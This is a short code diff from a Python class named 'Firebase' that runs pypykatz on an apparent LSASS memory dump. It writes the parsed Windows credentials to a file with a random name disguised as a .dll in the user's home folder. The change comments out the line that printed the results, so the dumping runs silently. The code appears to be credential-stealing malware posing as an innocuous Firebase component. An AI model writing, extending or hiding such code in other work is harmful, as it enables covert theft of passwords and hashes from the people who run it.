@@ -91,8 +91,8 @@ class Firebase:
         os.chdir(f"{os.environ['LOCALAPPDATA']}\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\Scripts")
         os.system(f"pypykatz.exe lsa minidump {os.environ['HOMEPATH']}\\{__chars__}.dmp --json -o {os.environ['HOMEPATH']}\\{__out__}.dll")
         
-        #Show Results
-         os.system(f"pypykatz.exe lsa minidump {os.environ['HOMEPATH']}\\{__chars__}.dmp")
+        #Show Results (You can comment this out)
+        #os.system(f"pypykatz.exe lsa minidump {os.environ['HOMEPATH']}\\{__chars__}.dmp")
 
     @property 
     def fire_base(self):
